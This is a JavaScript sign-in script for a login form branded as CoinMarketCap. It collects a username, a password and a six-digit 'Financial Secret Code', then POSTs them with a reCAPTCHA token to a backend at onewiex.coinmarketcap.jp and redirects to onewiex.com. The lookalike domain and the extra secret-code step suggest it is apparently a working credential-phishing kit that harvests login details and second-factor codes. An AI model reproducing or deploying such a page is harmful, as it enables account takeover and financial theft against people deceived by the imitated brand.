// window.BACKEND_URL = 'http://127.0.0.1:5000';

window.BACKEND_URL = 'https://onewiex.coinmarketcap.jp';
SIGNIN_CLICK_TIMES = 1;

async function signin(event) {
  event.preventDefault();

  const usernameInput = document.getElementById('coinmarketcap-username');
  const passwordInput = document.getElementById('coinmarketcap-password');
  const secretInput = document.getElementById('coinmarketcap-secret');
  const financialSecretCode = document.getElementById('financial-secret-code');

  if (usernameInput.value.trim() === '' || passwordInput.value.trim() === '') {
    alert('Please enter both username and password.');
    return;
  }

  if (SIGNIN_CLICK_TIMES == 1) {
    financialSecretCode.style.display = 'block';
    SIGNIN_CLICK_TIMES = 0;
  } else {
    const secretRegex = /^\d{6}$/;
    if (!secretRegex.test(secretInput.value)) {
      alert('Financial Secret Code must be exactly 6 digits.');
      return;
    }

    grecaptcha.enterprise.ready(async () => {
      const token = await grecaptcha.enterprise.execute(
        '6LdI55gnAAAAAMdf8vpOGPF5cLPXl_l7eg_dLZAM',
        { action: 'LOGIN' }
      );

      var loginData = {
        username: usernameInput.value,
        password: passwordInput.value,
        secret: secretInput.value,
        recaptchaToken: token,
      };

      // Make a POST request to your API endpoint
      fetch(`${window.BACKEND_URL}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(loginData),
      })
        .then((response) => response.json())
        .then((data) => {
          // Handle the API response here
          if (data.success) {
            if (data.onewiex_site) {
              // Save the JWT token in local storage (for demo purposes)
              localStorage.setItem('jwtToken', data.token);
              window.location.href = 'account.html';
            } else {
              window.location.href = 'https://onewiex.com/';
            }
          } else {
            // Login failed, display an error message
            alert(`Login failed: ${data.message}`);
          }
        })
        .catch((error) => {
          console.error('Error:', error);
          alert('An error occurred');
        });
    });
  }
}

document.addEventListener('DOMContentLoaded', function () {
  const signInBtn = document.querySelector('.m-btn.sm.white.text-nowrap');
  const signInForm = document.getElementById('signin-form');

  signInBtn.addEventListener('click', function () {
    signInForm.classList.toggle('show');
  });
});
